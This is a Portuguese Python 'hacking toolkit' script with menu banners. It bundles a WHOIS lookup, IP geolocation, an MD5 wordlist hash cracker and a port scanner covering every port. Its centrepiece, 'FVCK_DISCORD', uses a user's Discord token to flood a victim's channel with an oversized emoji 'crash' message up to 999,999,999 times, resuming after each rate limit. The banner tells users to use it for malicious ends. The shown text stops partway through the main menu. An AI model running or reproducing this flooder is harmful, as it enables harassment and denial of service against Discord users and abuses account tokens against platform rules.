# encoding: utf-8
#!/usr/bin/python
import socket
import os
import sys
from time import sleep
from random import choice
from colorama import Fore, Style
from os import name, system
import requests
import os
import sys
import argparse
import platform
from time import sleep
from crayons import *
from faker import Faker
import hashlib
import time
from requests import get
import urllib.request
import json
# fim dos imports.
#cores.
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"
tPreto = "\033[1;30m"
fVermelho = "\033[1;31m"
tVerde = "\033[1;32m"
tAmarelo = "\033[1;33m"
tAzul = "\033[1;34m"
tMagenta = "\033[1;35m"
tCiano = "\033[1;36m"
tCinzaClaro = "\033[1;37m"
tCinzaEscuro = "\033[1;90m"
tVermelhoClaro = "\033[1;91m"
tVerdeClaro  = "\033[1;92m"
tAmareloClaro = "\033[1;93m"
tAzulClaro = "\033[1;94m"
tMagentaClaro = "\033[1;95m"
tCianoClaro = "\033[1;96m"
tBranco = "\033[1;97m"
tNegrito = "\033[;1m"
tInverte = "\033[;7m"
tReset = "\033[0;0m"
# fim das cores.
def aviso():
  print(tBranco + "salve para slayyer e zoldyc! os de verdade akakak!")
  sleep(1)
  os.system(['clear', 'cls'][os.name == 'nt'])
  print(fVermelho + """ 
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:    Este script contém um conjunto de ferramentas desenvolvidas
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!    por nós: March0s1as, Gl4sya & Slayyer. Por favor, comportem-se
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!    e façam um mal uso da mesma. Utilizem-na somente para fins 
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!    maléficos. E se lembrem:
               ~?WuxiW*`   `"#$$$$8!!!!??!!!                                     We are The God's.
             :X- M$$$$       `"T#$T~!8$WUXU~      
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
    """)
  sleep(1)
  print(tBranco + "                                                                     λ ► https://github.com/march0s1as")
  sleep(1)
  print(tBranco +"                                                                     λ ► https://github.com/Gl4sya")
  sleep(1)
  print(tBranco + "                                                                     λ ► https://github.com/Slayyer-dev")
colors = [Fore.RED, Fore.BLUE, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.YELLOW]
os.system(['clear', 'cls'][os.name == 'nt'])
def logo_printer():
    logo = r"""
                            _)\.-.
                    .-.__,___,_.-=-. )\`  a`\_
                .-.__\__,__,__.-=-. `/  \     `\
                {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
                 \-,~_-~_-,~-,(_(_(;\/   ,;/
                  ",-.~_,-~,-~,)_)_)'.  ;;(
                    `~-,_-~,-~(_(_(_(_\  `;\
              ,          `"~~--,)_)_)_)\_   \
              |\              (_(_/_(_,   \  ;
              \ '-.       _.--'  /_/_/_)   | |
               '--.\    .'          /_/    | |
                   ))  /       \      |   /.'
                  //  /,        | __.'|  ||
                 //   ||        /`    (  ||
                ||    ||      .'       \ \\
                ||    ||    .'_         \ \\
                 \\   //   / _ `\        \ \\__
                  \'-'/(   _  `\,;        \ '--:,
                   `"`  `"` `-,,;         `"`",,;                                         
    """
    _logo_enumer = 0
    for char in logo:
        sys.stdout.write(f"{choice(colors)}{char}{Style.RESET_ALL}")
        sys.stdout.flush()
        _logo_enumer +=1
        sleep(0.005)
def whois():
  #imports
  try: 
    import socket
    import os
    import argparse
    from time import sleep
  except:
    print("[!]Dependencies not installed")
  #end

  #colors
  RED            = "\033[1;31m"
  LIGHT_RED      = "\033[1;91m"
  MAGENTA        = "\033[1;35m"
  BLUE           = "\033[1;94m"
  RESET          = "\033[0;0m"
  GREEN          = "\033[1;32m"
  #end

  os.system(['clear', 'cls'][os.name == 'nt'])
  #logo
  print(MAGENTA + """
                                                                
     ,---,                                                   ,--,    
    '  .' \                                                ,--.'|    
   /  ;    '.           ,----,  __  ,-.                    |  | :    
  :  :       \        .'   .`|,' ,'/ /|                    :  : '    
  :  |   /\   \    .'   .'  .''  | |' | ,--.--.     ,---.  |  ' |    
  |  :  ' ;.   : ,---, '   ./ |  |   ,'/       \   /     \ '  | |    
  |  |  ;/  \   \;   | .'  /  '  :  / .--.  .-. | /    /  ||  | :    
  '  :  | \  \ ,'`---' /  ;--,|  | '   \__\/: . ..    ' / |'  : |__  
  |  |  '  '--'    /  /  / .`|;  : |   ," .--.; |'   ;   /||  | '.'| 
  |  :  :        ./__;     .' |  , ;  /  /  ,.  |'   |  / |;  :    ; 
  |  | ,'        ;   |  .'     ---'  ;  :   .'   \   :    ||  ,   /  
  `--''          `---'               |  ,     .-./\   \  /  ---`-'   
                                      `--`---'     `----'            
                                                                     

  """)
  print(RED + """
  [+]Join in our Discord!
  [!]https://discord.gg/v5d3PZ9 
  """)
  print(BLUE + """
  [+]Subscribe in my channel!
  [!]https://www.youtube.com/channel/UCret_G0WHRBQYG5MesldNjw
  """)
  print(GREEN + """
  [+]Follow me in Github!
  [!]https://github.com/slayyer-dev
  """)
  print(LIGHT_RED + "Fé pros reais: \nhttps://github.com/Gl4sya\nhttps://github.com/march0s1as\nhttps://github.com/zy0x157" + RESET)
  #end

  host = input("Host λ ►  ").strip()
  try:
    try:
      socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      socket.connect(("whois.arin.net", 43))
      socket.send((host + "\r\n").encode())
      
      response = b""
      while True:
        data = socket.recv(4096)
        response += data
        if not data:
          break
      socket.close()
      sleep(2)
      os.system(['clear', 'cls'][os.name == 'nt'])
      print(response.decode())
      print("="*100)

    except:
      os.system(['clear', 'cls'][os.name == 'nt'])
      print(RED + "[!]Connection Failed" + RESET)
  except KeyboardInterrupt:
    os.system(['clear', 'cls'][os.name == 'nt'])
    print(RED + "[!]The progam has been aborted!")

  sleep(2)
  print(RED + """                      
            |\    _,--------._    / |
            | `.,'            `. /  |
            `  '              ,-'   '     Thanks for use this script!
             \/_         _   (     /      See you later! hehehe
            (,-.`.    ,',-.`. `__,'
             |/#\ ),-','#\`= ,'.` |
             `._/)  -'.\_,'   ) ))|
             /  (_.)\     .   -'//
            (  /\____/\    ) )`'\/
             \ |V----V||  ' ,    \/
              |`- -- -'   ,'   \  \      _____
       ___    |         .'    \ \  `._,-'     `-
          `.__,`---^---'       \ ` -'
             -.______  \ . /  ______,-
                     `.     ,'            

    """ + RESET)
  print("="*100)

  voltar = input(tCiano + """Deseja voltar ao menu principal? (sim/nao)
  ► """)
  if voltar == "sim":
    sleep(1)
    os.system(['clear', 'cls'][os.name == 'nt'])
    logo_printer()
    menu_principal()
  if voltar == "nao":
    sleep(1)
    exit()
def localizar_ip():
  print(tAmarelo + """
         .-"-.
       /  - -\\   puta que pariu
       \  @ @/     ele sabe onde eu moro
        (_ <_)
        _)(`
    ,_(`_))\\
     "-\)__/
      __|||__
     ((__|__))
""")
  print(" ")
  ip = input(tBranco + """Olá! Digite aqui o IP
  ►  """)
  print(" ")
  with urllib.request.urlopen(f"https://geolocation-db.com/json/8f12b5f0-2bc2-11eb-9444-076679b7aeb0/{ip}") as url:
    data = json.loads(url.read().decode())
    print(fVermelho + f"{data}")
    print(" ")
    voltar = input(tCiano + """Deseja voltar ao menu principal? (sim/nao)
    ► """)
    if voltar == "sim":
      sleep(1)
      os.system(['clear', 'cls'][os.name == 'nt'])
      logo_printer()
      menu_principal()
    if voltar == "nao":
      sleep(1)
      exit()

def VER_ip():
  print(tAmarelo + """  
┌─┐ ┬ ┬┌─┐┬    ┌┬┐┌─┐┬ ┬  ┬┌─┐┌─┐
│─┼┐│ │├─┤│    │││├┤ │ │  │├─┘ ┌┘
└─┘└└─┘┴ ┴┴─┘  ┴ ┴└─┘└─┘  ┴┴   o 
""")
  sleep(1)
  hostname = socket.gethostname()
  ip_interno = socket.gethostbyname(hostname)
  ip_externo = get('https://api.ipify.org').text
  print(fVermelho + f"λ ► Hostname: {hostname}")
  sleep(1)
  print(fVermelho + f"λ ► IP Interno: {ip_interno}")
  sleep(1)
  print(fVermelho + f"λ ► IP Externo: {ip_externo}")
  sleep(1)
  print (" ")
  voltar = input(tCiano + """Deseja voltar ao menu principal? (sim/nao)
  ► """)
  if voltar == "sim":
    sleep(1)
    os.system(['clear', 'cls'][os.name == 'nt'])
    logo_printer()
    menu_principal()
  else:
    exit()
def FVCK_H4SH():
  counter = 1
  sleep(1)
  print(tBranco + """   
                                    ___
                               ,-""   `.
                             ,'  _   e )`-._
                            /  ,' `-._<.===-'
                           /  /
                          /  ;         hash cracker by:
              _.--.__    /   ;            march0s1as.
 (`._    _.-""       "--'    |
 <_  `-""                     \\
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
  """)
  hash_md5 = input(tAmareloClaro + """Digite sua MD5
  ►  """)
  print(" ")
  sleep(1)
  wordlist_md5 = input(tCiano + """Digite a localização de sua wordlist
  ► """)
  sleep(2)
  os.system(['clear', 'cls'][os.name == 'nt'])
  print(tBranco + """   
                                    ___
                               ,-""   `.
                             ,'  _   e )`-._
                            /  ,' `-._<.===-'
                           /  /
                          /  ;         hash cracker by:
              _.--.__    /   ;            march0s1as.
 (`._    _.-""       "--'    |
 <_  `-""                     \\
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
  """)

  try:
      wordlist_md5 = open(wordlist_md5,"r")
  except:
      print(fVermelho + "\n puta brother, arquivo não encontrado.")
      quit()

  for senha in wordlist_md5:
      hash_obj = hashlib.md5(senha.strip().encode('utf-8')).hexdigest()
      start = time.time()
      sleep(2)
      print(" ")
      print(tBranco + "Tentando a senha %d ( %s )" % (counter,senha.strip()))
      counter += 1
      end = time.time()
      tempo = end - start

      if hash_obj == hash_md5:
          sleep(2)
          print(tVerde + "\nBoa, meu brother! A senha é ► %s " % senha)
          sleep(1)
          print(tVerde + "A bruteforce foi finalizada com êxito em  ► ",tempo,"segundos.")
          print(" ")
          sleep(1)
          print(tBranco + "Voltando para o menu principal..")
          sleep(5)
          os.system(['clear', 'cls'][os.name == 'nt'])
          logo_printer()
          menu_principal()
  else:
      print(fVermelho + "\n Senha não encontrada :(")

def PorkScan():
  os.system(['clear', 'cls'][os.name == 'nt'])
  sleep(1)
  print(tCianoClaro + """
          _nnnn_      ...............,
          dGGGGMMb     | Portscan     |
        @p~qp~~qMb    |   by: Gl4sya |
        M|@||@) M|   _;..............'
        @,----.JM| -'
        JS^\__/  qKL          
      dZP        qKRb
      dZP          qKKb
    fZP            SMMb
    HZM            MMMM
    FqM            MMMM
  __| ".        |\dS"qML
  |    `.       | `' \Zq
  _)      \.___.,|     .'
  \____   )MMMMMM|   .'
      `-'       `--' """)

  #Ip
  ip = input(tAzul + "Ip/Dominio do alvo:\n")
  os.system(['clear', 'cls'][os.name == 'nt'])
  sleep(2)
  print(tVerdeClaro + """
    ._________________.
    |.---------------.|
    ||      ,_,      ||     
    ||     (o,o)     ||   
    ||     {`"'}     || 
    ||     -"-"-     ||
    ||_______________||
    /.-.-.-.-.-.-.-.-./
    /.-.-.-.-.-.-.-.-.-./
  /.-.-.-.-.-.-.-.-.-.-./
  /______/__________\___o_/
  \_______________________/

  """)

  #Portscan
  for porta in range(1,65535):
      #Serviços
      http = 80 or 8081 or 8080 or 8082 or 8000
      ftp = 21 or 2121
      ssh = 22 or 2222
      
      #Ports
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(0.1)
      try:
          response = s.connect_ex((ip,porta))
          if response == 0:    
              print(tVerde + f"Porta {porta} Open!")
              if porta == http:
                  print(tBranco + f"{porta}     HTTP")
              if porta == ssh:
                  print(tBranco + f"{porta}     SSH")
      except:
          print("Não há portas abertas!")
          exit()

  #Logo        
  colors = [Fore.RED, Fore.BLUE, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.YELLOW]

  def logo_printer():
      logo = r""" 
  ▄▀▀▀█▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄▄▄▄      ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄▄   ▄▀▀▀▀▄ 
  █    █  ▐ █  █   ▄▀ ▐  ▄▀   ▐     █         █      █ █ ▄▀   █ █ █   ▐ 
  ▐   █     ▐  █▄▄▄█    █▄▄▄▄▄      █    ▀▄▄  █      █ ▐ █    █    ▀▄   
    █         █   █    █    ▌      █     █ █ ▀▄    ▄▀   █    █ ▀▄   █  
  ▄▀         ▄▀  ▄▀   ▄▀▄▄▄▄       ▐▀▄▄▄▄▀ ▐   ▀▀▀▀    ▄▀▄▄▄▄▀  █▀▀▀   
  █          █   █     █    ▐       ▐                  █     ▐   ▐                    
                  ___             ,_,              ___
                (o,o)           (o,o)         ,,,(o,o),,,
                {`"'}           {`"'}          ';:`-':;'
                -"-"-           -"-"-            -"-"-
      """
      _logo_enumer = 0
      for char in logo:
          sys.stdout.write(f"{choice(colors)}{char}{Style.RESET_ALL}")
          sys.stdout.flush()
          _logo_enumer +=1
          sleep(0.005)

  logo_printer()

  #Github
  print(tAzul + "Gl4sya's Github: https://github.com/Gl4sya/")
  print(tVerde + "March0s1a's Github: https://github.com/march0s1as/")
  print(tMagenta + "Vapula's Github: https://github.com/Mussoxd")

def FVCK_DISCORD():
  print(white + """
   /$$      /$$                                         /$$
  | $$$    /$$$                                        | $$
  | $$$$  /$$$$  /$$$$$$  /$$$$$$$  /$$   /$$  /$$$$$$ | $$
  | $$ $$/$$ $$ |____  $$| $$__  $$| $$  | $$ |____  $$| $$
  | $$  $$$| $$  /$$$$$$$| $$  \ $$| $$  | $$  /$$$$$$$| $$
  | $$\  $ | $$ /$$__  $$| $$  | $$| $$  | $$ /$$__  $$| $$
  | $$ \/  | $$|  $$$$$$$| $$  | $$|  $$$$$$/|  $$$$$$$| $$
  |__/     |__/ \_______/|__/  |__/ \______/  \_______/|__/                                                                                                                                                                         
  """)
  sleep(2)
  print(" ")
  print(cyan + "► Primeiramente, ative o modo desenvolvedor nas configurações do seu Discord.")
  sleep(2)
  print(" ")
  print( green + "► Logo em seguida, vá para o chat de quem você deseja atacar (user/server/grupo).")
  sleep(2)
  print(" ")
  print(magenta + "► Na URL de seu navegador, aparecerá o ID da mesma. Copie e cole abaixo.")
  sleep(2)
  print(" ")
  print(yellow + "► O script não funciona em quem está offline.")
  sleep(2)
  print(" ")
  print(white + "► Redirecionando você ...")
  sleep(4)
  os.system(['clear', 'cls'][os.name == 'nt']) 
  print(white + """
  <=======]}======
      --.   /|
    _\"/_.'/
  .'._._,.'
  :/ \{}/
  (L  /--',----._
      |          \\
    : /-\ .'-'\ / |
      \\, ||    \|
      \/ ||    ||                     
          """)
  itoken = input(yellow + """Insira seu token aqui 
  ► """)
  sleep(2)
  os.system(['clear', 'cls'][os.name == 'nt'])
  token = itoken # <-- coloque seu token (inspeciona elemento e dá f5 na página, o token é o "authorization")
  payload = {'content':'**🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐵🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒**'}
  headers = {'Authorization':token,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.12 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'}

  os.system(['clear', 'cls'][os.name == 'nt'])
  print(red + """
                ...                            
              ;::::;        Script produzido por: march0s1as the god.                
            ;::::; :;          Por favor, não faça o mal uso do mesmo.              
          ;:::::'   :;                     
          ;:::::;     ;.                        
        ,:::::'       ;           OOO\         
        ::::::;       ;          OOOOO\        
        ;:::::;       ;         OOOOOOOO       
        ,;::::::;     ;'         / OOOOOOO      
      ;:::::::::`. ,,,;.        /  / DOOOOOO    
    .';:::::::::::::::::;,     /  /     DOOOO   
  ,::::::;::::::;;;;::::;,   /  /        DOOO  
  ;`::::::`'::::::;;;::::: ,#/  /          DOOO 
  :`:::::::`;::::::;;::: ;::#  /            DOOO
  ::`:::::::`;:::::::: ;::::# /              DOO
  `:`:::::::`;:::::: ;::::::#/               DOO
  :::`:::::::`;; ;:::::::::##                OO
  ::::`:::::::`;::::::::;:::#                OO
  `:::::`::::::::::::;'`:;::#                O 
    `:::::`::::::::;' /  / `:#                  
    ::::::`:::::;'  /  /   `#              
  """)
  print(" ")
  print(" ")
  print(white + "Transcreva abaixo o ID da(s) vítima(s) --> ")
  channelId = input()
  for _ in range(999999999):
      r = requests.post(f'https://discord.com/api/v8/channels/{channelId}/messages', headers=headers, json=payload)
      if r.status_code == 200:
          print('Trava sendo enviada para a vítima. Apenas relaxe e goze! :)')
      elif r.status_code == 429:
          data = json.loads(r.text)
          print(f'O payload será enviado novamente em {data["retry_after"]} segundos')
          time.sleep(data['retry_after'])
      else:
          print(f'Que porra é essa? Por favor, verifique o ID ou o seu próprio token. Obrigado !')

def menu_principal():
  print(" ")
  print(fVermelho + "                     ► FVCK_DISCORD    (01) ")
  print(fVermelho + "                     ► FVCK_H4SH       (02)")
